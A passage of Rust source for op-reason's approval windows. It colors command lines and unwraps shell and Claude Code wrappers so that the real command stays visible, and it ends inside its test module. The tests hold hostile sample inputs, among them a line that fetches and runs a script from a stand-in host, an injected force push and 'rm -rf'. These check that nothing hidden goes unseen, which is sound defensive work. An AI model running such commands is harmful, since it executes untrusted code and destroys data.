//! What `op-reason.exe`'s windows draw, and the portable decisions behind it (design
//! `2026-11-26-modern-window-design.md` §4): the parts of a window ([`View`], built by [`crate::ui`] and
//! [`crate::relay_ui`], drawn by the Windows side), the colors of a command's words ([`color_words`]), the command a
//! person reads in a root's command line ([`root_command`]), the name in the relay's line about how long an answer lasts
//! ([`program_name`]), the marked words of the band ([`marked`]), the rows of chips ([`flow`]) and the language switch's
//! pill ([`pill`], [`pill_hit`]).

use op_reason_core::lang::Lang;

use crate::ui::Rect;

/// The mark in the header's tile.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Icon {
    /// An `op` call: a lock on the accent color.
    Lock,
    /// The SSH relay: a key on the caution color.
    Key,
}

/// The reason, or the words that stand in its place.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reason {
    Given(String),
    /// None was given: "no reason given", drawn in the caution color.
    Missing(String),
}

/// What a chip stands for (its mark or dot).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ChipKind {
    /// Claude Code: a purple dot.
    Claude,
    /// A person: a green dot.
    Person,
    /// A program, or a caller nobody can see: a gray dot.
    Other,
    Herdr,
    Wsl,
    /// The repository and its branch: a small repository mark.
    Repo,
    /// The directory.
    Folder,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Chip {
    pub kind: ChipKind,
    pub text: String,
}

/// A small line under the command (the relay).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FactKind {
    /// What the signature is for (12 DIPs, the text color, with a mark).
    Purpose,
    /// The destination, the host keys, the key (10 DIPs, tertiary).
    Detail,
    /// The ssh command (10 DIPs, tertiary, monospace).
    Mono,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fact {
    pub kind: FactKind,
    pub text: String,
}

/// The picture of the screen in the band.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Sketch {
    /// An `op` call: 1Password's prompt in the middle, filled.
    Op,
    /// The relay asks: op-reason's window highlighted, the prompt dashed and pale (to come).
    Ask,
    /// 1Password asks: the prompt dashed, the tray's dot larger.
    Asking,
}

/// The band: two lines (the first bold) with marked words ([`marked`]), and its picture. `keep`: the band says what the
/// window said before it had a band (while 1Password asks), so a window too tall for its screen keeps it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Band {
    pub title: String,
    pub line: String,
    pub sketch: Sketch,
    pub keep: bool,
}

/// Everything a window shows, top to bottom (design §4.2, §4.3). The buttons, the references, the orange line and the
/// switch come from [`crate::ui::Texts`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct View {
    pub icon: Icon,
    pub subtitle: String,
    /// `HH:MM:SS` (or the whole time when it has another form).
    pub time: String,
    /// `YYYY-MM-DD` (empty when the time has another form).
    pub date: String,
    pub reason_label: String,
    pub reason: Reason,
    pub chips: Vec<Chip>,
    pub code_label: String,
    /// The command in the monospace box ([`color_words`]).
    pub code: String,
    /// Under the box, small: the root process line when the box shows less than it.
    pub code_note: Option<String>,
    pub facts: Vec<Fact>,
    /// The notes (`shared-cleared`, `lock-skipped`), each with a mark.
    pub notes: Vec<String>,
    /// The relay's window that asks: the seconds left to answer, `{0}` for the number.
    pub countdown: Option<String>,
    /// After the countdown: how long an answer lasts, and the count of waiting calls.
    pub status: String,
    pub band: Band,
    /// The red line with the shield (empty: none).
    pub footer: String,
}

/// `YYYY-MM-DD HH:MM:SS` as the time and the date; another form as it is, without a date.
pub fn split_time(time: &str) -> (String, String) {
    let b = time.as_bytes();
    let shaped = b.len() == 19
        && b.iter().enumerate().all(|(i, c)| match i {
            4 | 7 => *c == b'-',
            10 => *c == b' ',
            13 | 16 => *c == b':',
            _ => c.is_ascii_digit(),
        });
    if shaped {
        (time[11..].to_owned(), time[..10].to_owned())
    } else {
        (time.to_owned(), String::new())
    }
}

/// The color of marked words.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Tone {
    Plain,
    /// `⟦…⟧`: the accent color.
    Accent,
    /// `⟪…⟫`: the caution color.
    Caution,
}

/// A text without its marks, and the spans of marked words (start and length in UTF-16 units of `text`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Marked {
    pub text: String,
    pub spans: Vec<(u32, u32, Tone)>,
}

/// Takes the marks out of a text of the band: `⟦…⟧` for the accent color, `⟪…⟫` for the caution color. A mark that does
/// not close is a plain character.
pub fn marked(s: &str) -> Marked {
    let mut text = String::new();
    let mut spans = Vec::new();
    let mut units = 0u32;
    let mut rest = s;
    while let Some(c) = rest.chars().next() {
        let (close, tone) = match c {
            '⟦' => ('⟧', Tone::Accent),
            '⟪' => ('⟫', Tone::Caution),
            _ => ('\0', Tone::Plain),
        };
        let after = &rest[c.len_utf8()..];
        if tone != Tone::Plain
            && let Some(end) = after.find(close)
        {
            let inner = &after[..end];
            let len = inner.encode_utf16().count() as u32;
            spans.push((units, len, tone));
            text.push_str(inner);
            units += len;
            rest = &after[end + close.len_utf8()..];
            continue;
        }
        text.push(c);
        units += c.len_utf16() as u32;
        rest = after;
    }
    Marked { text, spans }
}

/// A word of a command line as op-reason displays it ([`op_reason_core::ssh::cmdline::display`]): words between
/// spaces, a word in double quotes holding spaces (`\"` a quote inside).
struct Token {
    /// The word without its quotes.
    value: String,
    /// Where it is in the line (bytes, quotes included).
    start: usize,
    end: usize,
}

/// The words of a displayed command line; `None` when a quote does not close.
fn tokens(s: &str) -> Option<Vec<Token>> {
    lex(s, false)
}

/// [`tokens`]; with `cut`, a line that op-reason cut (it ends with `…`) may end inside a quote.
fn lex(s: &str, cut: bool) -> Option<Vec<Token>> {
    let mut out = Vec::new();
    let mut it = s.char_indices().peekable();
    while let Some(&(i, c)) = it.peek() {
        if c == ' ' || c == '\t' {
            it.next();
            continue;
        }
        let start = i;
        let mut value = String::new();
        let mut quoted = false;
        let mut end = s.len();
        while let Some(&(j, c)) = it.peek() {
            if !quoted && (c == ' ' || c == '\t') {
                end = j;
                break;
            }
            it.next();
            match c {
                '"' => quoted = !quoted,
                '\\' if quoted && it.peek().is_some_and(|&(_, n)| n == '"') => {
                    it.next();
                    value.push('"');
                }
                c => value.push(c),
            }
        }
        if quoted && !(cut && end == s.len() && value.ends_with('…')) {
            return None;
        }
        out.push(Token { value, start, end });
    }
    Some(out)
}

/// The UTF-16 offset of byte `at` of `s`.
fn utf16_at(s: &str, at: usize) -> u32 {
    s[..at].encode_utf16().count() as u32
}

/// The color of a command's word.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Word {
    /// The program and its subcommand: the accent color, bold.
    Program,
    /// A file name, a path, a reference: the path color.
    Path,
    /// Options and the rest: the command's text color.
    Plain,
}

/// A word made of letters, digits, `-` and `_`, starting with a letter (a subcommand such as `inject` or `push`).
fn plain_word(w: &str) -> bool {
    w.chars().next().is_some_and(|c| c.is_alphabetic())
        && w.chars()
            .all(|c| c.is_alphanumeric() || c == '-' || c == '_')
}

/// A file name, a path or a reference (design §4.6).
fn path_word(w: &str) -> bool {
    if w.starts_with(['/', '~', '.']) || w.starts_with("op://") || w.contains('\\') {
        return true;
    }
    let c: Vec<char> = w.chars().collect();
    c.windows(3)
        .any(|t| t[1] == '.' && t[0].is_alphanumeric() && t[2].is_alphanumeric())
}

/// The colored words of a command as the window shows it (design §4.6): ranges in UTF-16 units of `command`, with
/// their color; the spaces between words are not in any range. A line whose quote does not close is one plain range.
pub fn color_words(command: &str) -> Vec<(u32, u32, Word)> {
    let Some(words) = tokens(command) else {
        let n = command.encode_utf16().count() as u32;
        return if n == 0 {
            Vec::new()
        } else {
            vec![(0, n, Word::Plain)]
        };
    };
    let mut out: Vec<(u32, u32, Word)> = Vec::with_capacity(words.len());
    for (i, t) in words.iter().enumerate() {
        let start = utf16_at(command, t.start);
        let len = utf16_at(command, t.end) - start;
        let kind = if i == 0 || (i == 1 && plain_word(&t.value)) {
            Word::Program
        } else if path_word(&t.value) {
            Word::Path
        } else {
            Word::Plain
        };
        // the program and its subcommand: one range with the space between them
        match out.last_mut() {
            Some(last) if i == 1 && kind == Word::Program => last.1 = start + len - last.0,
            _ => out.push((start, len, kind)),
        }
    }
    out
}

/// A shell's name without its folder and `.exe`, in lowercase.
fn base_name(w: &str) -> String {
    let name = w
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(w)
        .to_ascii_lowercase();
    name.strip_suffix(".exe").map(str::to_owned).unwrap_or(name)
}

/// The words after a wrapper, as one command line: one word's value (a quoted command), or the words as they were.
fn rest_line(s: &str, rest: &[Token]) -> Option<String> {
    match rest {
        [] => None,
        [one] => Some(one.value.clone()),
        [first, .., last] => Some(s[first.start..last.end].to_owned()),
    }
}

/// What came off a root's command line (design §4.7): the command a person reads, and the line with that command
/// replaced by `…`. The window shows the first in its box and the second under it, so that the two show the whole line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Unwrapped {
    pub command: String,
    pub frame: String,
}

/// An option of a POSIX shell that runs nothing by itself: a group of `-c`, `-l`, `-i`, `-e`, `-x`, `-u`, or `--login`,
/// `--noprofile`, `--norc`. Whether it holds `-c`.
fn shell_option(v: &str) -> Option<bool> {
    if matches!(v, "--login" | "--noprofile" | "--norc") {
        return Some(false);
    }
    let group = v.strip_prefix('-').filter(|g| !g.is_empty())?;
    group
        .chars()
        .all(|c| "cliexu".contains(c))
        .then(|| group.contains('c'))
}

/// The execution policies of PowerShell (`-ExecutionPolicy <policy>`).
const POLICIES: [&str; 7] = [
    "Bypass",
    "RemoteSigned",
    "Unrestricted",
    "AllSigned",
    "Restricted",
    "Default",
    "Undefined",
];

/// The command a person reads in a root's command line (design §4.7): only the root's own arguments are read as
/// arguments (what a shell runs is code, and is shown as it is), and a wrapper comes off only when it matches exactly:
///
/// 1. a shell started to run one command: `bash`, `sh`, `zsh`, `dash`, `fish` with options that run nothing themselves,
///    `-c` among them, then the command string and nothing after it; `cmd.exe` with `/c` (after `/d`, `/s`, `/q` only);
///    `pwsh` or `powershell` with `-Command` (or `-c`) after `-NoProfile`, `-NonInteractive`, `-NoLogo` and
///    `-ExecutionPolicy <policy>`;
/// 2. inside a POSIX shell's command string, Claude Code's wrapper of its Bash tool ([`unwrap_claude`]).
///
/// `None` when nothing comes off: the line is shown as it is, also one whose quoting does not close. A line that
/// op-reason cut (it ends with `…`) gives a command only from Claude Code's `eval`, up to the cut.
pub fn root_command(cmd: &str) -> Option<Unwrapped> {
    let cut = cmd.ends_with('…');
    let words = lex(cmd, cut)?;
    let (program, args) = words.split_first()?;
    match base_name(&program.value).as_str() {
        "bash" | "sh" | "zsh" | "dash" | "fish" => {
            // the shell reads options until the first other word, which `-c` makes the command string
            let mut command = false;
            let mut at = 0;
            while let Some(a) = args.get(at) {
                if !a.value.starts_with('-') {
                    break;
                }
                command |= shell_option(&a.value)?;
                at += 1;
            }
            let [string] = &args[at..] else {
                return None;
            };
            if !command {
                return None;
            }
            let head = &cmd[..string.start];
            match unwrap_claude(&string.value) {
                Some(inner) => Some(Unwrapped {
                    command: inner.command,
                    frame: format!("{head}\"{}", inner.frame) + if cut { "" } else { "\"" },
                }),
                None if cut || string.value.trim().is_empty() => None,
                None => Some(Unwrapped {
                    command: string.value.clone(),
                    frame: format!("{head}\"…\""),
                }),
            }
        }
        "cmd" if !cut => {
            let at = args
                .iter()
                .position(|a| a.value.eq_ignore_ascii_case("/c"))?;
            let before = args[..at].iter().all(|a| {
                ["/d", "/s", "/q"]
                    .iter()
                    .any(|o| a.value.eq_ignore_ascii_case(o))
            });
            before.then_some(())?;
            rest_unwrapped(cmd, &args[at + 1..])
        }
        "pwsh" | "powershell" if !cut => {
            let mut at = 0;
            while let Some(a) = args.get(at) {
                match a.value.to_ascii_lowercase().as_str() {
                    "-noprofile" | "-noninteractive" | "-nologo" => at += 1,
                    "-executionpolicy" => {
                        let policy = args.get(at + 1)?;
                        POLICIES
                            .iter()
                            .any(|p| policy.value.eq_ignore_ascii_case(p))
                            .then_some(())?;
                        at += 2;
                    }
                    "-command" | "-c" => return rest_unwrapped(cmd, &args[at + 1..]),
                    _ => return None,
                }
            }
            None
        }
        _ => None,
    }
}

/// The command after `cmd.exe /c` or `pwsh -Command`: the rest of the line, shown as it is.
fn rest_unwrapped(cmd: &str, rest: &[Token]) -> Option<Unwrapped> {
    let first = rest.first()?;
    let command = rest_line(cmd, rest).filter(|c| !c.trim().is_empty())?;
    let quoted = rest.len() == 1 && cmd[first.start..].starts_with('"');
    Some(Unwrapped {
        command,
        frame: format!(
            "{}{}",
            &cmd[..first.start],
            if quoted { "\"…\"" } else { "…" }
        ),
    })
}

/// Splits `s` at `sep` outside quotes, as a POSIX shell reads them (single quotes, double quotes, a backslash outside
/// single quotes escaping the next character); `None` when a quote does not close.
fn split_outside_quotes<'s>(s: &'s str, sep: &str) -> Option<Vec<&'s str>> {
    #[derive(PartialEq)]
    enum In {
        Plain,
        Single,
        Double,
    }
    let mut parts = Vec::new();
    let mut from = 0;
    let mut state = In::Plain;
    let mut escaped = false;
    let mut i = 0;
    let b = s.as_bytes();
    while i < b.len() {
        let c = b[i];
        if escaped {
            escaped = false;
        } else {
            match state {
                In::Single if c == b'\'' => state = In::Plain,
                In::Single => {}
                In::Double if c == b'\\' => escaped = true,
                In::Double if c == b'"' => state = In::Plain,
                In::Double => {}
                In::Plain if c == b'\\' => escaped = true,
                In::Plain if c == b'\'' => state = In::Single,
                In::Plain if c == b'"' => state = In::Double,
                // compared as bytes: `i` may be inside a character that is not ASCII
                In::Plain if b[i..].starts_with(sep.as_bytes()) => {
                    parts.push(&s[from..i]);
                    i += sep.len();
                    from = i;
                    continue;
                }
                In::Plain => {}
            }
        }
        i += 1;
    }
    if state != In::Plain {
        return None;
    }
    parts.push(&s[from..]);
    Some(parts)
}

/// How a single-quoted string read from just after its opening quote ended.
enum Quoted<'s> {
    /// Its value (`'\''` and `'"'"'` are quotes) and what follows the closing quote.
    Closed(String, &'s str),
    /// The line ends inside it with `…` (a line cut by op-reason): the value up to the cut.
    Cut(String),
}

fn single_quoted(s: &str) -> Option<Quoted<'_>> {
    let mut value = String::new();
    let mut rest = s;
    loop {
        let Some(end) = rest.find('\'') else {
            return rest.strip_suffix('…').map(|cut| {
                value.push_str(cut);
                Quoted::Cut(value)
            });
        };
        value.push_str(&rest[..end]);
        let after = &rest[end + 1..];
        if let Some(more) = after
            .strip_prefix("\\''")
            .or_else(|| after.strip_prefix("\"'\"'"))
        {
            value.push('\'');
            rest = more;
        } else {
            return Some(Quoted::Closed(value, after));
        }
    }
}

/// A name of a shell function or alias, as Claude Code's wrapper quotes it.
fn shell_name(q: &str) -> bool {
    q.strip_prefix('\'')
        .and_then(|q| q.strip_suffix('\''))
        .is_some_and(|n| {
            !n.is_empty()
                && n.chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        })
}

/// A path without anything a shell would expand or run: no spaces, quotes, `$`, redirections, globs or groups.
fn plain_path(p: &str) -> bool {
    !p.is_empty()
        && p.chars()
            .all(|c| !c.is_whitespace() && !"|&;<>()$`\"'*?[]{}!#=%\\".contains(c))
}

/// Claude Code's snapshot of the shell: `…/.claude/shell-snapshots/snapshot-….sh`, or the older
/// `/tmp/claude-shell-snapshot`.
fn snapshot_path(p: &str) -> bool {
    plain_path(p)
        && (p == "/tmp/claude-shell-snapshot"
            || (p.contains("/.claude/shell-snapshots/snapshot-") && p.ends_with(".sh")))
}

/// A part of Claude Code's wrapper that only prepares the shell (design §4.7, rule 2), word for word: reading its
/// snapshot, turning `extglob` off, dropping an alias and a function of one name, writing the directory afterwards.
fn harmless(seg: &str) -> bool {
    let w: Vec<&str> = seg.split(' ').collect();
    match w.as_slice() {
        ["source", f] | ["source", f, "2>/dev/null", "||", "true"] => snapshot_path(f),
        ["shopt", "-u", "extglob", "2>/dev/null", "||", "true"]
        | [
            "\\builtin",
            "shopt",
            "-u",
            "extglob",
            "2>/dev/null",
            "||",
            "true",
        ] => true,
        ["pwd", "-P", ">|", f] => plain_path(f) && f.ends_with("-cwd"),
        [
            "{",
            "\\builtin",
            "unalias",
            "--",
            a,
            "\\builtin",
            "unset",
            "-f",
            "--",
            b,
            "}",
            ">/dev/null",
            "2>&1",
            "||",
            "true",
        ] => a == b && a.strip_suffix(';').is_some_and(shell_name),
        _ => false,
    }
}

/// What came off a command string.
struct Inner {
    command: String,
    /// The string with the command replaced by `…`.
    frame: String,
}

/// Claude Code's wrapper of its Bash tool (design §4.7, rule 2): parts joined by ` && ` that only prepare the shell
/// ([`harmless`]) and one `eval '<command>'` (optionally ` \< /dev/null`): the command inside the quotes. A string cut
/// inside the quotes gives the command up to the cut and `…`.
fn unwrap_claude(s: &str) -> Option<Inner> {
    // the eval's quotes may be cut (a line cut by op-reason): only what comes before the eval is split
    let start = if s.starts_with("eval '") {
        0
    } else {
        s.find(" && eval '")? + " && ".len()
    };
    let head = s[..start].strip_suffix(" && ").unwrap_or(&s[..start]);
    if !head.is_empty()
        && !split_outside_quotes(head, " && ")?
            .iter()
            .all(|p| harmless(p))
    {
        return None;
    }
    let before = &s[..start];
    match single_quoted(s[start..].strip_prefix("eval '")?)? {
        Quoted::Cut(value) => Some(Inner {
            command: format!("{value}…"),
            frame: format!("{before}eval '…"),
        }),
        Quoted::Closed(value, after) => {
            let tail = after.strip_prefix(r" \< /dev/null").unwrap_or(after);
            let ok = tail.is_empty()
                || tail
                    .strip_prefix(" && ")
                    .and_then(|t| split_outside_quotes(t, " && "))
                    .is_some_and(|parts| parts.iter().all(|p| harmless(p)));
            ok.then(|| Inner {
                command: value,
                frame: format!("{before}eval '…'{after}"),
            })
            .filter(|i| !i.command.trim().is_empty())
        }
    }
}

/// Whether a command line holds `&&`, `||`, `;` or `|` outside quotes: more than one program.
fn compound(s: &str) -> bool {
    let mut quote: Option<char> = None;
    let mut escaped = false;
    for c in s.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        match (quote, c) {
            (None, '\\') => escaped = true,
            (None, '\'' | '"') => quote = Some(c),
            (Some(q), c) if c == q => quote = None,
            (None, ';' | '|' | '&') => return true,
            _ => {}
        }
    }
    false
}

/// The program named in "Allowing covers this `<name>` until it ends" (design §4.8): the command's program (its file
/// name without `.exe`), and for `git` its subcommand. `None` for an empty line or more than one program.
pub fn program_name(command: &str) -> Option<String> {
    if compound(command) {
        return None;
    }
    let words = tokens(command)?;
    let first = words.first()?;
    let name = base_name(&first.value);
    if name.is_empty() {
        return None;
    }
    let original = first
        .value
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(&first.value);
    let shown = if original.to_ascii_lowercase().ends_with(".exe") {
        &original[..original.len() - 4]
    } else {
        original
    };
    match words.get(1) {
        Some(sub) if name == "git" && plain_word(&sub.value) => {
            Some(format!("{shown} {}", sub.value))
        }
        _ => Some(shown.to_owned()),
    }
}

/// Where items of `widths` go in rows of width `row`, `gap` apart: the row and the x of each. An item wider than a row
/// takes a row of its own at 0.
pub fn flow(widths: &[f32], row: f32, gap: f32) -> Vec<(usize, f32)> {
    let mut out = Vec::with_capacity(widths.len());
    let (mut r, mut x) = (0usize, 0f32);
    for &w in widths {
        if x > 0.0 && x + w > row {
            r += 1;
            x = 0.0;
        }
        out.push((r, x));
        x += w + gap;
    }
    out
}

/// The switch's pill: English then 日本語, each its text's width and `pad` on both sides, ending at `right`.
pub fn pill(widths: [f32; 2], pad: f32, right: f32, top: f32, height: f32) -> [Rect; 2] {
    let ja = widths[1] + 2.0 * pad;
    let en = widths[0] + 2.0 * pad;
    let bottom = top + height;
    [
        Rect {
            left: right - ja - en,
            top,
            right: right - ja,
            bottom,
        },
        Rect {
            left: right - ja,
            top,
            right,
            bottom,
        },
    ]
}

/// The language a click at (`x`, `y`) chooses: the half of the language not `shown`.
pub fn pill_hit(rects: &[Rect; 2], shown: Lang, x: f32, y: f32) -> Option<Lang> {
    [Lang::En, Lang::Ja]
        .into_iter()
        .zip(rects)
        .find(|(lang, r)| *lang != shown && r.contains(x, y))
        .map(|(lang, _)| lang)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_time_and_the_date() {
        assert_eq!(
            split_time("2026-11-15 06:05:00"),
            ("06:05:00".to_owned(), "2026-11-15".to_owned())
        );
        assert_eq!(
            split_time("12:34:56"),
            ("12:34:56".to_owned(), String::new())
        );
        assert_eq!(
            split_time("2026-11-15T06:05:00"),
            ("2026-11-15T06:05:00".to_owned(), String::new())
        );
    }

    #[test]
    fn the_marks_of_the_band() {
        let m = marked("ふつう⟦画面の中央⟧に出ます");
        assert_eq!(m.text, "ふつう画面の中央に出ます");
        assert_eq!(m.spans, vec![(3, 5, Tone::Accent)]);
        let m = marked("出ないときは⟪右下のトレイ⟫の 1Password (^ の中) から");
        assert_eq!(m.text, "出ないときは右下のトレイの 1Password (^ の中) から");
        assert_eq!(m.spans, vec![(6, 6, Tone::Caution)]);
        let m = marked(
            "Usually in the ⟦middle of the screen⟧; if not, from the ⟪tray at the bottom right⟫",
        );
        assert_eq!(
            m.text,
            "Usually in the middle of the screen; if not, from the tray at the bottom right"
        );
        assert_eq!(
            m.spans,
            vec![(15, 20, Tone::Accent), (54, 24, Tone::Caution)]
        );
        assert_eq!(marked("plain").spans, vec![]);
        let open = marked("a ⟦b");
        assert_eq!(open.text, "a ⟦b", "a mark that does not close stays");
        assert!(open.spans.is_empty());
    }

    fn words_of(cmd: &str) -> Vec<(String, Word)> {
        let units: Vec<u16> = cmd.encode_utf16().collect();
        color_words(cmd)
            .into_iter()
            .map(|(s, n, w)| {
                (
                    String::from_utf16_lossy(&units[s as usize..(s + n) as usize]),
                    w,
                )
            })
            .collect()
    }

    #[test]
    fn the_colors_of_a_command() {
        use Word::*;
        assert_eq!(
            words_of("op inject -i app.env.tpl -o .env"),
            vec![
                ("op inject".to_owned(), Program),
                ("-i".to_owned(), Plain),
                ("app.env.tpl".to_owned(), Path),
                ("-o".to_owned(), Plain),
                (".env".to_owned(), Path),
            ]
        );
        assert_eq!(
            words_of("git push origin fix/login"),
            vec![
                ("git push".to_owned(), Program),
                ("origin".to_owned(), Plain),
                ("fix/login".to_owned(), Plain),
            ]
        );
        assert_eq!(
            words_of(r#"ssh.exe git@github.com "git-receive-pack 'me/r.git'""#),
            vec![
                ("ssh.exe".to_owned(), Program),
                ("git@github.com".to_owned(), Path),
                (r#""git-receive-pack 'me/r.git'""#.to_owned(), Path),
            ]
        );
        assert_eq!(
            words_of("op read op://Private/proxmox/token"),
            vec![
                ("op read".to_owned(), Program),
                ("op://Private/proxmox/token".to_owned(), Path),
            ]
        );
        assert_eq!(
            words_of(r#"op inject -i "C:\Users\me\AppData\Local\Temp\app.env.tpl" -o .env"#)[2].1,
            Path
        );
        assert_eq!(
            words_of("op vault list")[0],
            ("op vault".to_owned(), Program)
        );
        assert_eq!(
            words_of(r#"a "b"#),
            vec![(r#"a "b"#.to_owned(), Plain)],
            "a quote that does not close: one plain range"
        );
        assert!(color_words("").is_empty());
    }

    /// The command and the frame of a root command line that unwraps.
    fn unwrap(cmd: &str) -> (String, String) {
        let u = root_command(cmd).unwrap_or_else(|| panic!("nothing came off {cmd}"));
        (u.command, u.frame)
    }

    #[test]
    fn the_root_commands_of_claude_code() {
        // tests/cases/roots.json, rule claude, as cmdline::display shows the roots
        assert_eq!(
            unwrap(r#"bash -c -l "source /tmp/claude-shell-snapshot && eval 'git push'""#),
            (
                "git push".to_owned(),
                r#"bash -c -l "source /tmp/claude-shell-snapshot && eval '…'""#.to_owned()
            )
        );
        assert_eq!(
            unwrap(r#"cmd.exe /d /s /c "pwsh -NoProfile -NonInteractive -Command \"ssh-add -l\"""#),
            (
                r#"pwsh -NoProfile -NonInteractive -Command "ssh-add -l""#.to_owned(),
                r#"cmd.exe /d /s /c "…""#.to_owned()
            ),
            "only the root's own arguments come off: what cmd.exe runs is shown as it is"
        );
        assert_eq!(unwrap(r#"bash.exe -c -l "ssh host""#).0, "ssh host");
        assert_eq!(root_command("SSH.EXE host"), None);
        // the screenshots' call
        assert_eq!(
            unwrap(r#"bash -c -l "git push origin fix/login""#),
            (
                "git push origin fix/login".to_owned(),
                r#"bash -c -l "…""#.to_owned()
            )
        );
    }

    /// Claude Code's wrapper as its Bash tool runs commands now (seen on 2026-11-26), as `cmdline::display` shows it.
    fn claude_now(eval: &str) -> String {
        let pre = [
            "source /home/u/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true",
            r"\builtin shopt -u extglob 2>/dev/null || true",
            r"{ \builtin unalias -- 'which'; \builtin unset -f -- 'which'; } >/dev/null 2>&1 || true",
            r"{ \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true",
        ]
        .join(" && ");
        format!(r#"bash -c "{pre} && eval '{eval}' && pwd -P >| /tmp/claude-f37c-cwd""#)
    }

    #[test]
    fn the_root_command_of_claude_codes_wrapper_now() {
        let (command, frame) = unwrap(&claude_now("git push origin main"));
        assert_eq!(command, "git push origin main");
        assert_eq!(
            frame,
            claude_now("…"),
            "the frame is the whole line with the command as …"
        );
        assert_eq!(
            unwrap(&claude_now(r#"echo '\"'\"'hi'\"'\"'"#)).0,
            "echo 'hi'",
            "a quote inside the eval, as this wrapper writes it (displayed with escaped double quotes)"
        );
        assert_eq!(
            unwrap(r#"bash -c -l "source /tmp/claude-shell-snapshot && eval 'git commit -m '\''fix it'\''' \< /dev/null""#).0,
            "git commit -m 'fix it'",
            "a quote as the older wrapper writes it"
        );
        assert_eq!(
            unwrap(&claude_now("cd a && git push")).0,
            "cd a && git push",
            "&& inside the eval"
        );
        let mut cut = claude_now("git log --oneline --decorate --graph");
        cut.truncate(cut.find("--decorate").unwrap() + "--decorate".len());
        cut.push('…');
        let (command, frame) = unwrap(&cut);
        assert_eq!(
            command, "git log --oneline --decorate…",
            "a line cut inside the eval: the command up to the cut"
        );
        assert!(frame.ends_with("eval '…"), "{frame}");
        let mut early = claude_now("git push");
        early.truncate(early.find("shopt").unwrap());
        early.push('…');
        assert_eq!(root_command(&early), None, "a line cut before the eval");
        let unknown = claude_now("git push")
            .replace(r"\builtin shopt -u extglob 2>/dev/null || true", "rm -rf x");
        let (command, _) = unwrap(&unknown);
        assert!(
            command.starts_with("source ") && command.contains("rm -rf x"),
            "an unknown part: the shell's whole command string"
        );
    }

    #[test]
    fn what_runs_is_never_hidden() {
        // shell code is not read as arguments: what follows the command inside the eval is shown with it
        let sneaky = r#"bash -c \"git push origin fix/login\" -x;git${IFS}push${IFS}-f${IFS}origin${IFS}HEAD:main"#;
        let (command, _) = unwrap(&claude_now(sneaky));
        assert!(command.contains("HEAD:main"), "{command}");
        // a part of the wrapper that runs something of its own: the whole string
        for part in [
            "source <(curl${IFS}-s${IFS}https://evil.example/x)",
            "source ./evil.sh",
            "source /home/u/.claude/shell-snapshots/snapshot-x.sh;evil",
            "source /home/u/.claude/shell-snapshots/snapshot-x.sh || evil",
            "pwd -P >| /tmp/claude-1-cwd;evil",
            r"{ \builtin unalias -- 'which'; \builtin unset -f -- 'ls'; } >/dev/null 2>&1 || true",
        ] {
            let line = format!(r#"bash -c "{part} && eval 'git push origin fix/login'""#);
            let (command, _) = unwrap(&line);
            assert!(command.starts_with(part), "{part}: {command}");
        }
        // a snapshot that matches comes off the box, but stays in the frame under it
        let (command, frame) = unwrap(
            r#"bash -c "source /home/u/.claude/shell-snapshots/snapshot-evil.sh && eval 'git push'""#,
        );
        assert_eq!(command, "git push");
        assert!(frame.contains("snapshot-evil.sh"), "{frame}");
        // the root's own arguments: options first, only those that run nothing, and nothing after the string
        assert_eq!(root_command(r#"bash "git push origin fix/login" -c"#), None);
        assert_eq!(root_command(r#"bash -o pipefail -c "x""#), None);
        assert_eq!(root_command(r#"bash --x -c "git status""#), None);
        assert_eq!(root_command(r#"bash -c "x" extra"#), None);
        assert_eq!(
            root_command(r#"pwsh -ExecutionPolicy x -Command "git status""#),
            None
        );
        assert_eq!(
            unwrap(r#"pwsh -ExecutionPolicy Bypass -Command "git status""#).0,
            "git status"
        );
        assert_eq!(root_command(r#"pwsh -NoProfile -File x.ps1"#), None);
        assert_eq!(
            root_command(r#"cmd.exe /k "git push""#),
            None,
            "/k keeps the shell"
        );
        assert_eq!(
            unwrap("cmd.exe /c git push origin main"),
            ("git push origin main".to_owned(), "cmd.exe /c …".to_owned())
        );
    }

    #[test]
    fn a_root_command_shown_as_it_is() {
        assert_eq!(
            root_command(r#"bash -c -l "git push origin fix/lo…"#),
            None,
            "a cut line without Claude Code's eval"
        );
        assert_eq!(
            root_command(r#"bash -c "git push"#),
            None,
            "a quote that does not close"
        );
        assert_eq!(root_command("git pull --rebase"), None);
        assert_eq!(root_command("bash"), None);
        assert_eq!(root_command(r#"bash -c """#), None, "an empty command");
    }

    #[test]
    fn no_line_makes_it_panic() {
        let lines = [
            claude_now("git push origin main"),
            claude_now("echo 日本語 && git push"),
            r#"bash -c "source /c/Users/太郎/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true && eval 'git push' && pwd -P >| /tmp/claude-…-cwd""#.to_owned(),
            r#"cmd.exe /d /s /c "pwsh -NoProfile -Command \"ssh-add -l\"""#.to_owned(),
            "op inject -i \"C:\\Users\\me\\app.env.tpl\" -o .env".to_owned(),
            "ssh.exe 太郎@例え.jp \"echo '🙂'\"".to_owned(),
        ];
        for line in &lines {
            let ends: Vec<usize> = line
                .char_indices()
                .map(|(i, _)| i)
                .chain([line.len()])
                .collect();
            for end in ends {
                let mut cut = line[..end].to_owned();
                cut.push('…');
                for s in [&line[..end], cut.as_str()] {
                    let _ = root_command(s);
                    let _ = color_words(s);
                    let _ = program_name(s);
                    let _ = marked(s);
                }
            }
        }
